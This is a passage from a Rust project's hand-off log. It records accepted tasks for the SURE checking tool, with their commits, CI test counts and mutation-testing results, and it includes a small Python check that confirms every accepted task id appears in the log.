  the first one is the hard one**: `fmt` is a check and `cargo fmt` is not, because
  `cargo fmt` **rewrites the source tree** — a check built from it would change the
  state it was about, the result would describe the project before the run and the
  fingerprint taken before it would agree with the result and with nothing on disk.
  So it runs the same tool's own read-only form, `format_command` **appending that
  one flag to the discovery's own string** rather than composing a command, and
  **the title moves with the flag**: `titled` does not give the format check
  `plain_name()`'s sentence, which says *"rewrite the source to a style"*.
  `super::node` and `super::python` both *drop* their format role, rightly, since
  `prettier --write` and `ruff format` are those ecosystems' conventional forms;
  Rust is where the flag **is** the conventional form, so dropping it would leave
  the acceptance's first word with no check under it. The four weights are held as
  a value by `the_table_carries_the_four_weights_this_module_argues_for`, because
  `P4-T002`'s first mutation run found four flips of a table like this one passing
  the whole suite. Run `34982674189` was **red on macOS** — and the one failing
  test, `a_service_that_is_dropped_is_stopped_anyway`, **is not this commit's**: it
  is `P3-T009`'s, it failed on the one platform whose scheduler put the child
  between two adjacent statements, and the guard inside it is what refused to call
  the resulting measurement a pass. The fix it forced is `702cfee`, attributed to
  `P3-T009`; run `34983449923` is all five green at **1394 / 1395 / 1396**.
- `ed96627` + `fa35ed7` **`P4-T005`** — `crates/sure-core/src/setup.rs` (+1391,
  new), `crates/sure-core/src/documents.rs` (+640), `tests/setup_validation.rs`
  (+950, 10 integration tests), `tests/document_commands.rs` (+105), one line of
  `lib.rs`. The acceptance is two sentences and they are **different kinds of
  claim**: *"Safe claims/paths/scripts can be validated."* is about what the pass
  decides, and *"Arbitrary README shell text is not blindly run."* is about what
  the code contains — so the check for the second is made of the source rather
  than of a run. **A documented command becomes a claim only when `script_from`
  can read it as a package manager running a named script** (`npm run build`,
  `npm run-script build`, and npm's four shorthands); anything else — `cargo test`,
  a line with a pipe, an assignment — produces **no claim at all** rather than a
  claim of unknown status, because reading `foo | bar` as the manager running the
  script `|` would be an inference about a line that is a program. `Contradicted`
  may only be returned when the pass can answer for the places it did **not** look,
  the script rule is deliberately coarse and the comment says so, and
  `SetupReport::is_complete` delegates to `DocumentReport::is_complete` so the two
  cannot drift. A manifest SURE could not read is `None`, which produces
  `CannotConfirm` and **never** *"declares no scripts"*. Every contradiction is
  `ShouldFixFirst`, never `MustFix`, because the wrong half of a disagreement
  between two artefacts is not knowable from here. **`fa35ed7` is the fix the CI
  matrix forced**: `C:/Windows/win.ini` is a path prefix to `Path` on Windows and
  one ordinary relative component on Linux and macOS, so a README telling a Windows
  user where a font lives became a claim about a file *inside the project* on two
  platforms of three and was answered `Contradicted`; the reading is now taken from
  the characters (`names_a_drive`), and `leaves_the_project` still asks the
  platform, with its test writing **both** answers down under `#[cfg]`.
  Run `34991517761` was red on macOS and Ubuntu; run `34995107384` is all five
  green at **1462 / 1463 / 1464**, **`+2` on every platform**, nameset **`+2 −0`**.
- `585d634` **`P4-T006`** — `crates/sure-core/src/env_completeness.rs` (+1116, new,
  17 unit tests), `crates/sure-core/tests/env_completeness.rs` (+696, 10
  integration tests), one line of `lib.rs`. Acceptance: *"Missing
  key/documentation mismatches are reported without requiring secret values"*, and
  **this task adds no reader**: `crate::references` already reads the two lists and
  already declines to conclude from them. The rule is that a one-sided key is a
  claim **only if the reading finished** — `assess` takes `complete` and `unread`
  as parameters rather than looking them up, because both are facts about the
  reading and not about the key — and **nothing is ever `Contradicted`**, which is
  a property of the subject rather than a gap, since an undeclared key refutes
  nothing. **The second half of the acceptance is answered by an absence**: the
  module contains no call to `with_excerpt` at all, and the reason it can be zero
  is the reason it has to be — the line a key is read on is the line a value is on,
  so `process.env.API_KEY = "…"` is one line and an excerpt here would be a
  credential. **Nothing is quoted, so there is nothing to redact**, which is a
  stronger promise than a redaction step can make. Severity follows the missing
  side (`ShouldFixFirst` / `CanFixLater`) and **neither reaches `MustFix`**;
  `PROVIDED_BY_RUNTIME` is a public, exact, case-insensitive list of 53 names a
  process is given before any project code runs, and a key on it still becomes a
  claim carrying `Severity::Note` and reachable through `set_aside()`. Run
  `34999750331`, all five `success`, **1489 / 1490 / 1491** passed, 0 failed, 11
  ignored, **54** result lines = **44 parents + 10 children**, **`+27` on every
  platform**, nameset **`+27 −0`**.
- `576d2b0` **`P4-T007`** — `crates/sure-core/src/db_migrations.rs` (+1641, new, 24
  unit tests), `crates/sure-core/tests/db_migrations.rs` (+649, 10 integration
  tests), `discover/read.rs` (`lookup_key` `pub(super)` → `pub(crate)`),
  `discover/mod.rs` (+5) and one line of `lib.rs`. Acceptance: *"Framework-specific
  detectors are pluggable. Mandatory missing-migration fixture can be detected."*
  **The first sentence is the one that shaped the module**: a `Detector` is a row
  of four constants — the file that says a framework is in use, the path it keeps
  its record at, the predicate deciding what counts as a migration, and its name —
  and `look`, `count_under` and `assess` name no framework anywhere, which two
  tests hold by detecting one from the test's own table. **A gap is a claim only
  where the shape is and the record is not**: `Record::Holds(n)` for `n > 0`
  produces **no claim at all**, `Empty` is `MustFix` and `Absent` is
  `ShouldFixFirst`, because a project that never wrote its first migration and one
  whose record was lost look the same from here and `prisma init` writes the first.
  **The one thing a later task has to know**: `evaluation/acceptance-manifest.json`
  expects `must_fix` for `missing-migration` and this check reaches it through the
  *present-and-empty* shape, while `fixtures/adversarial/missing-migration/` is
  `P14`'s — so both shapes are pinned by integration tests here and the
  correspondence is left to `P14`. It is the crate's first use of
  `AnchorSubject::Database`. Run `35004072122`, all five `success`, **1523 / 1524 /
  1525** passed, 0 failed, 11 ignored, **55** result lines = **45 parents + 10
  children**, **`+34` on every platform**, nameset **`+34 −0`**; twenty-one
  mutation rows, twenty-one caught.
- `23d7ae8` **`P4-T008`** — `crates/sure-core/src/dependency_state.rs` (+961, new,
  5 unit tests after one was deleted), `crates/sure-core/tests/dependency_state.rs`
  (+633, 12 integration tests) and one line of `lib.rs`. Acceptance: *"Missing
  dependencies are distinguishable from failing project code. Install remains
  separate approved action."* — **two sentences pulling in opposite directions**,
  resolved by giving the reading a different **subject**: not *what is this
  project* but *what can SURE do with it right now*, a property of the **run**
  rather than of the project, which is why it belongs beside the check results it
  reads and not in a `Discovery`. **The rule is one-directional**: a sentinel SURE
  met means nothing and a sentinel it did not meet over a walk that finished means
  one thing, so every way of being wrong in the presence direction is silent. The
  severity is `Severity::Note`, argued from the frozen text rather than chosen —
  `MustFix` would make a fresh clone of a healthy project block a hand-off, and
  `ShouldFixFirst`'s *"material reliability or quality risk"* is the wrong subject
  as well as the wrong weight. **The table has one row and both omissions are
  argued**: Rust has no gap to find, and Python is out because a walk cannot see an
  interpreter that is first on the path — the honest reason is that SURE cannot
  tell, not that Python projects need no installing. **One unit test was deleted
  rather than the guard widened to admit it**: `check_schedule`'s proposer rule
  does not cut at `#[cfg(test)]`, and exempting `dependency_state.rs` would have
  weakened a real rule and asserted something false about a module that proposes
  nothing. Run `35046550608`, all five `success`, **1540 / 1541 / 1542** passed, 0
  failed, 11 ignored, **56** result lines = **46 parents + 10 children**, **`+17`
  on every platform**, nameset **`+17 −0`**; twenty-six mutation rows, twenty-six
  caught, **two deliberately not written as equivalent mutants**.

- `d379103` **`P4-T009`** — `crates/sure-core/src/aggregation.rs` (+857, new: 530
  lines shipped and a 328-line test module holding **11** unit tests),
  `crates/sure-core/tests/aggregation.rs` (+1150, new, **15** integration tests) and
  one line of `lib.rs` — 2012 insertions across three files. Acceptance: *"Critical
  skipped/error/unknown is visible. False-green unit tests exist."* — **two
  sentences, and the second is a claim about this task's own tests rather than about
  its behaviour**, which is what shaped several of them. **The frozen rule is called
  and not one part of it is restated**: `aggregate` is the only aggregation entry
  point (ADR 0010) and two source rules hold that over the tree rather than over the
  prose — one over this file, one that walks every shipped source file in the
  workspace because a rule over one file says nothing about the next file. **Two
  things the frozen function cannot see and both are false greens**: a check the plan
  named for which no result came back (the same list without its failing check is not
  an incomplete run but a *greener* one), and which kind of not-checked
  (`critical_not_checked` is one list holding `Skipped`, *"I was not allowed to
  look"*, and `Unknown`, *"I looked and could not tell"*). **The plan decides the
  run**: one row per scheduled check in plan order; a result for a check the plan
  never proposed is reported and not aggregated; a stopped check that came back
  claiming it ran is aggregated as the plan's stopped entry and recorded as
  `overruled`. Determinism is tested as a property — six results, **all 720 orders**.
  **Two refusals and neither is repaired** — a duplicate result id, and a result from
  another project state — because repairing either would be the false green the rest
  of the module prevents. Run `35050752542`, all five `success`, **1566 / 1567 /
  1568** passed, 0 failed, 11 ignored, **57** result lines = **47 parents + 10
  children**, **`+26` on every platform**, nameset **`+26 −0`**; twenty-four mutation
  rows, **the first run leaving `m14` and `m24` surviving with 0 tests catching
  each**, both closed by tests written for them and the set **then re-run in full**:
  **24 caught, 0 survivors, 0 inconclusive**. **The survivors were found by
  re-reading the log and not by re-running the set, and the first reading of that log
  was wrong** — the survivor marker's em-dash reaches the log as replacement bytes,
  so a search for it as written finds nothing, and a search that finds nothing reads
  exactly like a session with no survivors. This acceptance closes `P4`: 9 of 9.

- `c9057d7` **`P5-T001`** (accepted at `3cabc96`) — *"Implement runtime probe planner"*,
  and **the task that gave `start` and `dev` a consumer**. Five files, **+2271 −4**:
  `crates/sure-core/src/runtime_probes.rs` (**+1152**, new) and
  `crates/sure-core/tests/runtime_probes.rs` (**+1071**, new), plus
  `crates/sure-core/src/checks/node.rs` (+39 −4), one line of `lib.rs` and twelve of
  `tests/check_schedule.rs`. **The sentence this module is the first to keep was
  already written down three phases earlier**: `checks/node.rs` says why four of
  `ScriptRole`'s eight variants produce checks and four do not — *"`dev` and `start`
  **do not finish**. They are servers, and a check is something that ends. Starting
  one is what `service` and `checks.browser_probe` are for"* — prose written when
  those two roles had **no consumer anywhere in the shipped source**, and
  `ScriptRole::Start` and `ScriptRole::Dev` are now read in exactly one place. Four
  `pub(crate)` widenings carry the load — `Runner`, `Runner::of`, `components` and
  `command_for` — each with a doc paragraph naming `P5-T001` as the second caller,
  **because a widening whose documentation does not say who else is calling it is
  indistinguishable from a visibility change nobody needed**. Two kinds and **three
  absences, and the absences are the decisions**: a route check is absent because
  `CheckReason`'s own rule refuses one (`P5-T003`'s work), `ActionKind::ExternalService`
  is absent as a boundary rather than a gap (`P5-T006`'s subject), and
  `ActionKind::ArbitraryCommand` is absent as forbidden — there is no field a caller
  could put a command line in. Run `35054249354`: all five green, Windows **1595** /
  macOS **1596** / Ubuntu **1597**, 0 failed, 11 ignored, **58** result lines = **48
  parents + 10 children**, **+29 on every platform**, `+1` result line, `+1` parent,
  `+0` children; nameset **`+29 −0`**, and the 29 are exactly the module's **14** unit
  tests and **15** integration tests. The acceptance run `35056098080` is identical to
  it in every figure with a nameset delta of **`+0 −0`** — and **it is the run where
  the platform-drift reading was noticed**, its pairwise sets being `windows vs macos:
  −13 +14` and `windows vs ubuntu: −14 +16`, which is why the `−12 +14` recorded
  against `P3-T006`'s rows is high by two names. Twenty-five mutation rows, and **the
  first run was 23 caught, 2 survivors, 0 inconclusive** with the survivors `m20` and
  `m25`; both were closed by tests written for them and **the set was then re-run in
  full against the committed blob, because the two earlier trees no longer exist** —
  one vintage, twenty-five rows, the same file the commit holds. Ten of the
  twenty-five are caught by exactly one test, and the widest row is caught by
  **sixteen**; the most-used catcher is
  `a_probe_carries_the_weight_it_argues_for_and_nothing_louder` at 9 rows, **and it is
  the sole catcher of four (`m11`–`m14`)**, which is the concentration risk the entry
  records rather than a reassurance. Detail in *What `P5-T001` added*, above.
- `ee050da` **`P5-T002`** (accepted at `14ca785`, with the fix commit `0b72dce`
  between them) — *"Implement web/service start smoke check"*, *"Supported service can
  be started/probed/terminated"* and *"Startup failure remains explicit"*. Two commits
  because **the tree the first one pushed is not the tree the task is accepted on**.
  `ee050da` is five files, **+2757 −35**: `crates/sure-core/src/runtime_start.rs`
  (**+881**, new), `crates/sure-core/tests/runtime_start.rs` (**+1790**, new),
  `support.rs` (+22), one line of `lib.rs`, and a census rule in
  `tests/spawn_sites.rs` (+98) that moves the third rule's exemption list from one
  file to two. `0b72dce` is **+57 −1 in the one source file**, and it exists because a
  push review named this module and reading its security surface found **a service
  able to erase the report of its own failure while a person was reading it**. **The
  table of endings is total, every arm has a status, and the two arms that could be
  mistaken for a pass are the two the tests are written against** — including the row
  with two ways in, *"it ended by itself"*, which is a failure whether it ended inside
  the window or after it, **because a service that exits is not a service whatever it
  printed on the way out**. `StartSmoke::of` takes an `Enforcement` rather than a
  command, which is `enforce.rs`'s own rule applied one level up, and the lookup is by
  the probe's **own** check id — the decoy test admits two commands with the **decoy
  first**, so a lookup that took the first command it found takes the wrong one. Runs
  `35063118526` (Windows **1618** / macOS **1619** / Ubuntu **1620**, **+23 on every
  platform**, ignored 11 → 12, nameset **`+24 −1`**, the `−1` a rename and the
  arithmetic closing exactly: 23 passed + 1 ignored = 24 test functions) and
  `35064050013` (Windows **1619**, **+1 on every platform**, nameset **`+1 −0`** = the
  one name `runtime_start::tests::a_service_cannot_write_an_escape_into_the_line_sure_prints`).
  Thirty-four mutation rows, and **the first run was 33 rows — 30 caught, 1 declared
  unobservable, 2 survivors** — against the accepted log's **`all 32 observable
  mutations caught by a failing test, and 2 declared unobservable as expected`**: 34
  rows, 0 survivors, 0 that failed to build, 0 skipped. **18 of the 32 are caught by
  exactly one test**, 10 by two and 4 by three, with 22 distinct catchers, and the two
  most-used catchers are the tests a service that ends or overruns is read through, at
  7 rows each. Detail in *What `P5-T002` added*, above.

- `e5d5b06` **`P5-T003`** (accepted at the progress-only commit that follows `e5d5b06` and carries this entry) — *"Implement HTTP route smoke
  framework"*, *"Project-exposed HTTP endpoints can be probed"* and *"Failed route
  smoke checks remain visible"*. **The task's own detail is the section above**; this
  entry is the place in the accepted list that names it, and what belongs here is the
  shape rather than a second telling: two files added and three changed,
  `crates/sure-core/src/http_routes.rs` at **1952** lines and
  `crates/sure-core/tests/http_routes.rs` at **1508**, the reading that decides which
  declared routes become checks and the probing that asks each one, **with the two
  kept apart so that a route SURE cannot place is reported rather than silently
  dropped**. **One push, and its run was red once before it was green.** `35086572733` is Windows **1643** / macOS **1644** / Ubuntu **1645** passed, **0 failed**, 12 ignored, **60** result lines = **50 parents + 10 children**, **+24 on every platform** against `35067317216` with a nameset delta of **`+24 −0`** naming exactly the twelve unit tests and the twelve integration tests. **Its first attempt was red on Ubuntu** — two tests in `runtime_start.rs` and `service_supervisor.rs`, neither of them this task's, both `Text file busy (os error 26)` — and the re-run of that one job, inside the same run, came back green; both facts are in the run table's row for this commit and in the section below the table.  Thirty-five mutation rows, **red twice**: the first
  run left five survivors and one row that did not compile, the second left one
  survivor, and the third was stopped in flight when the second review changed the source under it, and **the fourth run is `all 35 observable mutations caught by a failing test, and 0 declared unobservable as expected`** **The survivors are the record here and not the
  count** — the second run's survivor is the most serious thing this set found, a
  route the project declares and does not serve that stopped blocking green, which is
  a false green one field to the left of the status.

**This list had been missing four entries, and they are added above rather than
noted as a gap.** `P2-T007`, `P2-T009`, `P2-T010` and `P2-T011` were all
`accepted` and none of them appeared here: the list was last extended for
`P2-T012` and `P2-T008`, and the tasks accepted after those two were never added,
so a reader counting entries here would have found 23 where `progress/state.json`
records 32 accepted tasks. Two entries cover more than one task and one covers no
task at all, so the two numbers were never meant to be equal — which is exactly
why nobody noticed. **The check is the set and not the count**: the task ids named
above are the accepted set read out of `progress/state.json`, and the four that
were absent were absent from a list whose heading says "accepted work on this
branch" and which a reader is entitled to treat as complete. The stale ordering
sentence in the header was the same defect one paragraph up, found in the same
pass, and it is recorded there rather than only here.

**And the same defect recurred immediately: `P3-T004` was missing too**, and
`P3-T005`'s acceptance commit adds it above along with its own entry. It was
`accepted`, it was pushed as `967c5e6`, and it appeared in this file's narrative
and in `DECISIONS.md` while being absent from the list whose heading says
"accepted work on this branch". **A fix that lasted exactly one task is worth less
than the check**, so the check is what is written down here: the accepted set is
`progress/state.json`'s, the list is complete when every id in it appears below
that heading, and the count is not the test — two entries cover more than one task
and one covers none.

**Then it recurred a third time, five entries at once, and the check that was
written down two tasks earlier had never been executed even once.** Run for the
first time while writing this paragraph, it returns **thirteen** ids: `P3-T006`
through `P3-T010`, which accumulated over four acceptance commits, and **the
eight `P0` ids, which have been absent since this list was first written.** The
`P0` ones are not a false positive and the first draft of this paragraph called
them one: `P0-T001` through `P0-T008` each have a commit on this branch
(`82650ac`, `dc44ae0`, `06e64b2`, `69bde28`, `84f1dd0`, `f643187`, `fe7ad52`,
`9d95e1a`) and none of them was ever named below this heading, so **the list has
never been complete — not once, from the first task**. That is what the
correction above records: the assumption that the eight were exempt was made from
`state.json`'s empty `head_sha` fields rather than from `git log`, and `git log`
is where the commits are.

**The check was right and it was not run, and those are different failures.** A
check written in prose has no output, so nothing distinguishes *it passed* from
*it was not run* — and this file has now spent three paragraphs on a check that
cost one command. The command, run against the tree this commit is on:

```
$ python - <<'PY'
import json,io
tasks=json.load(io.open('progress/state.json',encoding='utf-8'))['tasks']
acc=sorted(k for k,v in tasks.items() if v.get('status')=='accepted')
lines=io.open('progress/HANDOFF.md',encoding='utf-8').read().split('\n')
start=next(i for i,l in enumerate(lines) if l.startswith('## Accepted work on this branch'))
end=next(i for i,l in enumerate(lines[start+1:],start+1) if l.startswith('## '))
sec='\n'.join(lines[start:end])
print('accepted:',len(acc),'missing:',[a for a in acc if a not in sec] or 'none')
PY
accepted: 42 missing: none
```

**`42` and `none` are the numbers this commit is entitled to print**, and they are
printed rather than asserted. `P3-T010`'s acceptance is what makes the count 42,
and the thirteen entries added above are what make the second field empty.

**Run again by `P3-T011`'s acceptance, and it printed `accepted: 43 missing:
none`.** The count moved because `P3-T011` is the task that commit accepts and the
second field is empty because the entry above was added in the same edit —
**which is the only thing that keeps them in step**: the check and the entry are
one commit apart at best, and the four acceptance commits that accumulated the
thirteen missing ids are what that costs. **A check whose subject the same commit
edits has to be re-run after the edit**, and this paragraph exists because the
temptation is to run it before.

**Run again by `P4-T001`'s acceptance, and it prints `accepted: 44 missing:
none`.** Forty-three was the previous reading and it is left standing above rather
than overwritten, because the sentence it sits in is a claim about what
`P3-T011`'s acceptance printed and not a claim about the file today. **The check
was run *after* the entry was added, which is the order the paragraph above
insists on**, and the id it would have reported missing had it been run first is
`P4-T001` — the task this commit accepts.

**Run again by `P4-T002`'s acceptance, and it prints `accepted: 45 missing:
none`.** Forty-four is the previous reading and it is left standing above, for the
reason given there. The check was run *after* the `0bf09c2` entry was added, which
is the order the paragraph above insists on, and the id it would have reported
missing had it been run first is `P4-T002` — the task this commit accepts. **This
is the fourth acceptance in a row to print a number here, and the first of the four
is the only one that found anything**: it returned thirteen missing ids, and the
three since have each printed `none`, because the entry and the check have shipped
in the same commit every time since. **`none` three times running is not evidence
that the check is unnecessary** — the gap it was written for took four acceptance
commits to accumulate and was invisible for all four — so the standing cost stays
one command per acceptance, and the alternative is recorded three paragraphs up.

**Run again by `P4-T008`'s acceptance, and it prints `accepted: 51 missing:
none` — and it is the second time this check has found anything, because it was
not run for six acceptances.** `45` was the last reading recorded above, at
`P4-T002`; the four acceptances that followed it each wrote a `## What
\`P4-T00n\` added` section, a run-table row and a `DECISIONS.md` entry, and none
of them extended the list below this heading. So **`P4-T003` through `P4-T008`
were all `accepted` and all absent from it** — six tasks, one more than the five
that accumulated the last time this happened, and found the same way: by running
the command rather than by reading the paragraphs that say to run it. **The six
entries above were written in this commit, and the check was run *after* they
were added**, which is the order the paragraph above insists on and the reason
the second field is empty rather than naming six ids. **`none` four times running
was worth exactly what it cost**, and the cost was one command per acceptance that
went unspent six times — the check's output is the only thing that distinguishes
*it passed* from *it was not run* — and what it printed here is the second
reading, not the fourth. **The stale paragraphs are left standing above**, because
each is a claim about what a specific acceptance printed, and the gap between them
is the record.

**And this is the fourth occurrence, so the check was skipped across a gap a third
time.** Run at this acceptance against the tree before the entries above were added,
it returns **`accepted: 54 missing: ['P5-T001', 'P5-T002']`** — exactly the two tasks
accepted in the window, and **the window is three acceptances long**: the last reading
recorded above is `P4-T008`'s, `accepted: 51 missing: none`, and the acceptances since
are `P4-T009`, `P5-T001` and `P5-T002`. **`P4-T009` added its own entry and the other
two did not, which is the whole of the difference between them** — nothing separates
those three acceptances but whether the person writing it ran the command, and the two
that did not are named by the check to the id. **The check has now been run five
times and skipped twice, and both gaps were closed by the same run that found them**:
the six-acceptance gap `P4-T008` closed, and this three-acceptance one. After the
entries above, the same command returns **`accepted: 55 missing: none`**, and that is
the reading the next acceptance has to reproduce rather than assume — **the count was
never the test and the command is the test**, which is why the command is what is
written down here and not the number it printed.

## Next concrete action
1. **`P4-T009` is implemented, pushed, read, and accepted by the commit carrying
   this file, and it is one commit.** `d379103` adds
   `crates/sure-core/src/aggregation.rs` (**857 lines**: `aggregate_run` and the
   `RunReport` it returns, `critical_checks`, `CriticalCheck` with its private
   fields and accessors, the two-variant `RunRefused`, the private `state_label`
   with no wildcard arm, and `nothing_came_back`; **11 `#[test]` functions, two of
   which were written after the first mutation run**),
   `crates/sure-core/tests/aggregation.rs` (**1150 lines, 15 `#[test]`
   functions**) and one line of `lib.rs` — 2012 insertions across three files. Run
   `35050752542`, all five jobs `success`: Windows **1566** / macOS **1567** /
   Ubuntu **1568** passed, 0 failed, 11 ignored, **57** result lines = **47
   parents + 10 children**, and **Windows 1566 is the same figure the local
   `cargo test --workspace --no-fail-fast` gives**. Against `35046550608`, the run
   of `23d7ae8` and this task's `base_sha`: **`+26` on every platform, +1 result
   line, +1 parent, +0 children**, with a nameset delta of **`+26 −0`** that equals
   the passed delta. **The mutation set is 24 rows, and its first run is the
   finding: 22 caught, with `m14` and `m24` surviving and 0 tests catching each.**
   Both were closed by tests written for them and the set was then **re-run in
   full** — **24 caught, 0 survivors, 0 inconclusive**, every restore verified by
   blob hash, 44 result lines and `passed + caught = 1279` in every row. **The
   survivors were found by re-reading the log and not by re-running the set, and
   the first reading of that log was wrong**: the survivor marker's em-dash reaches
   the log as replacement bytes, so a search for the marker as written finds
   nothing, and a search that finds nothing reads exactly like a session with no
   survivors. `progress/DECISIONS.md` carries the argument; `What \`P4-T009\` added`
   above carries the reading.
   **Accepting this task does unblock work, and the READY list is unchanged anyway
   — the first time in five acceptances that the second half is not the whole
   answer.** `P7-T004`, `P8-T007` and `P14-T007` each name `P4-T009` in
   `depends_on` and all three now hold it `accepted`, so those three edges are
   discharged; none of the three becomes READY, because each is still waiting on
   one other task — `P5-T006`, `P8-T006` and `P7-T005` respectively. So the READY
   list is the same **eight** entries before and after, confirmed by `taskctl
   status` itself after the accept rather than by a second reading of a replay:
   `P5-T001`, `P6-T001`, `P6-T005`, `P6-T007`, `P8-T001`, `P12-T008`, `P13-T001`,
   `P13-T004`. **This acceptance closes `P4` — 9 of 9, the fourth phase complete —
   so the next concrete action is the lowest-numbered READY entry, `P5-T001`,
   which opens a new phase and nothing about this acceptance chose it.**
   **The renumbering, recorded the way the earlier acceptances recorded theirs.**
   Inserting this item moved every item below it by one, and `grep -n "item [0-9]"`
   over the file **as the script found it** counted **30 lines, of which ten are live
   and twenty are dated narrative**. The
   ten live ones were bumped and each was then re-read against the printed list
   **after** the renumbering rather than before it: the snapshot item `19 → 20`
   (two lines in the state section and two in this list), the `.cmd`/`.bat` owner
   decision `25 → 26` (five lines), and the `ComponentGraph` reference `22 → 23`,
   which was checked by printing item 23's first line and seeing `P2-T007`, the
   task that owns `components.rs` — the same check the acceptance below records,
   run again rather than trusted. **The twenty dated lines were deliberately not
   touched**, including the ones that narrate *earlier* renumberings — `item 17 →
   18`, `item 15 → 16`, `item 18 → 19`, `item 13 → 14`, `item 16 → 17` — because
   each of those is a claim about what a specific acceptance found and printed, and
   rewriting them would destroy the only record of the failure mode they are about.
   **The renumbering was done by `target/tmp/p4t009-renumber.py`, which prints every
   line it changes and refuses to run if the list is not numbered `1..N`**, so the
   verification is a printout rather than a re-reading.
   **Two things about that script are worth writing down because its docstring says
   neither.** It has to run *before* the item is inserted, not after: its guard reads
   the list as it currently stands, so run first it bumps `1..25` to `2..26` and the
   new item then goes in as `1.`, which is the order used here, whereas inserting
   first would leave the list numbered `1, 1, 2, …` and the guard would refuse. And
   the count it reports is a count of the file **at that moment**, so it is not the
   number a later reader's `grep` prints — **this paragraph's own three `item N`
   lines are added by the insertion**, which is why the acceptance below records
   **28** where the script here counted **30**, and why a `grep` over the accepted
   file reads **33**. The arithmetic runs 28 → 30 → 33 and every step of it is a
   different moment; **a count stated without the moment it was measured at is the
   same defect this list has been recording about item numbers all along**, so the
   figure here is stated with its moment and the later one is given rather than left
   to be discovered.
2. **`P4-T008` is implemented, pushed, read, and accepted by the commit carrying
   this file, and it is one commit.** `23d7ae8` adds
   `crates/sure-core/src/dependency_state.rs` (**961 lines**: the one-row
   `ECOSYSTEMS` table, `InstallState` and its three-valued `of`, `Reading`,
   `Dependencies::met` over the walk's two lists, `Assessed::action`, and
   `DependencyReport::of/claims/reading/is_complete/is_empty`; **5 `#[test]`
   functions** after one was deleted), `crates/sure-core/tests/dependency_state.rs`
   (**633 lines, 12 `#[test]` functions**) and one line of `lib.rs`. Run
   `35046550608`, all five jobs `success`: Windows **1540** / macOS **1541** /
   Ubuntu **1542** passed, 0 failed, 11 ignored, **56** result lines = **46
   parents + 10 children**, and **Windows 1540 is the same figure the local
   `cargo test --workspace --no-fail-fast` gives**. Against `35043954360`, the run
   of `928920b` and this task's `base_sha`: **`+17` on every platform, +1 result
   line, +1 parent, +0 children**, with a nameset delta of **`+17 −0`** that equals
   the passed delta. **The commit is green on its first push, and the one failure
   the task produced was local and was a guard working correctly**:
   `check_schedule`'s proposer rule does not cut at `#[cfg(test)]` and refused a
   unit test that named `ExecutionRequirements`, so that test was deleted rather
   than the rule widened — its one missing assertion moved into
   `an_install_is_a_separate_action_that_needs_its_own_permission`. **The mutation
   set is 26 rows, 26 caught, 0 survivors, 0 inconclusive**, every restore verified
   by blob hash, every row running the same 1253-test suite (43 result lines and
   `passed + caught = 1253` in every row), and **two rows were deliberately not
   written** because both are equivalent mutants no test in this suite could see.
   `progress/DECISIONS.md` carries the argument; `What \`P4-T008\` added` above
   carries the reading.
   **Accepting this task unblocks nothing, for the fourth acceptance running, and
   the next concrete action is `P4-T009`** — the lowest-numbered READY entry and
   **`P4`'s last task**, so the phase closes when it is accepted. No task in the
   catalogue names `P4-T008` in its `depends_on`, so the READY list is the same
   **nine** entries before and after: `P4-T009`, `P5-T001`, `P6-T001`, `P6-T005`,
   `P6-T007`, `P8-T001`, `P12-T008`, `P13-T001`, `P13-T004`. `P4-T009` depends on
   `P0-T004`, `P4-T002`, `P4-T003` and `P4-T004`, all four `accepted`.
   **Two gaps in this file were found while writing this acceptance, and neither
   was found by reading the paragraphs that say to look for them.** The first is
   that the accepted-set check recorded three paragraphs up had not been run since
   `P4-T002` — six acceptances — and the `## Accepted work on this branch` list was
   **six entries short**, `P4-T003` through `P4-T008`; running it printed
   `accepted: 51 missing: none` **after** those entries were written, and the
   reading is recorded there. The second is that **this list was five items short**:
   the four acceptances between `P4-T002` and this one each wrote a section, a
   run-table row and a `DECISIONS.md` entry and none of them extended the numbered
   list, so no item was ever written for `P4-T003`, `P4-T004`, `P4-T005`,
   `P4-T006` or `P4-T007`. **They are not back-filled here, and that is a choice
   rather than an omission**: an item in this list is a statement about what the
   next session should do, and one written now for `P4-T003` would be a
   reconstruction of a moment that has passed instead of a record of one that
   happened. What those five tasks *are* is recorded where it is checkable — in
   `## What \`P4-T00n\` added`, in the run table, in the accepted-work list and in
   `progress/DECISIONS.md` — and what is recorded here is the gap itself.
   **The renumbering, recorded the way the earlier acceptances recorded theirs.**
   Inserting this item moved every item below it by one, and `grep -n "item [0-9]"`
   found **28 lines, of which ten are live and eighteen are dated narrative**. The
   ten live ones were bumped and each was then re-read against the printed list
   **after** the renumbering rather than before it: the snapshot item `18 → 19`
   (two lines in the state section and two in this list), the `.cmd`/`.bat` owner
   decision `24 → 25` (five lines), and the `ComponentGraph` reference `21 → 22`,
   which was checked by printing item 22's first line and seeing `P2-T007`, the
   task that owns `components.rs`. **The eighteen dated lines were deliberately
   not touched**, including the ones that narrate *earlier* renumberings — `item
   17 → 18`, `item 15 → 16`, `item 18 → 19`, `item 13 → 14`, `item 16 → 17` —
   because each of those is a claim about what a specific acceptance found and
   printed, and rewriting them would destroy the only record of the failure mode
   they are about. **The renumbering was done by `target/tmp/p4t008-renumber.py`,
   which prints every line it changes and refuses to run if the list is not
   numbered `1..N`**, so the verification is a printout rather than a re-reading.
3. **`P4-T002` is implemented, pushed, read, and accepted by the commit carrying
   this file, and it is one commit.** `0bf09c2` adds
   `crates/sure-core/src/checks/mod.rs` (**651 lines**: `check_id` and the
   `sure.check-id.v1` digest domain, `MissingKind` with its three variants, and
   `MissingCommand`; 5 `#[test]` functions),
   `crates/sure-core/src/checks/node.rs` (**1022 lines**: the four-row role table
   over `ScriptRole`, `Runner::of`, and `NodeChecks::of/proposed/missing/is_empty/
   not_checked`), `crates/sure-core/tests/node_checks.rs` (**731 lines, 9
   `#[test]` functions**), three edits to `crates/sure-core/src/schedule.rs`
   (+38 −25), `MANIFEST` made `pub` in `discover/node.rs`, `mod digest` made
   `pub(crate)` in `fingerprint/mod.rs`, the `MAY_PROPOSE` list in
   `tests/check_schedule.rs`, and one line of `lib.rs`. **This is the first
   commit on the branch that proposes a check, and the rule saying nothing did
   was written to fail here** — `tests/check_schedule.rs` carried it from
   `P4-T001` and this commit is where somebody reads `MAY_PROPOSE` and the
   paragraph above it. **Accepting this task unblocked nothing**: its only
   dependent is `P4-T009`, whose four requirements include `P4-T003` and
   `P4-T004`, both still `queued`, so the READY list went `15 → 14`. Run
   `34969139607`, all five jobs `success`, Windows **1334** / macOS **1335** /
   Ubuntu **1336** passed, 0 failed, 11 ignored, **50** result lines; **`+28` on
   every platform** against `34964462368`, and the Windows name table decomposes
